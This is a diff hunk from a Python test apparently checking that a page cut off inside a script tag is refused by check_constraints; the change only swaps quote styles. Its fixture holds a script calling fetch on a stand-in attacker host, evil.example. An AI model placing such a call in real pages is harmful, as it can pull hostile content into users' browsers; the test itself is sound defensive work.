@@ -665,10 +665,10 @@ def test_a_page_cut_off_inside_a_script_is_refused_rather_than_cleared() -> None
     truncated = (
         "<!doctype html><html><head><title>Bias</title><style>"
         ":root { --surface: #fff; }"
-        '@media (prefers-color-scheme: dark) { :root { --surface: #111; } }'
+        "@media (prefers-color-scheme: dark) { :root { --surface: #111; } }"
         ':root[data-theme="dark"] { --surface: #111; }'
         "body { background: var(--surface); }"
-        "</style></head><body><script>fetch(\"https://evil.example/x\")"
+        '</style></head><body><script>fetch("https://evil.example/x")'
     )
 
     messages = check_constraints(truncated)
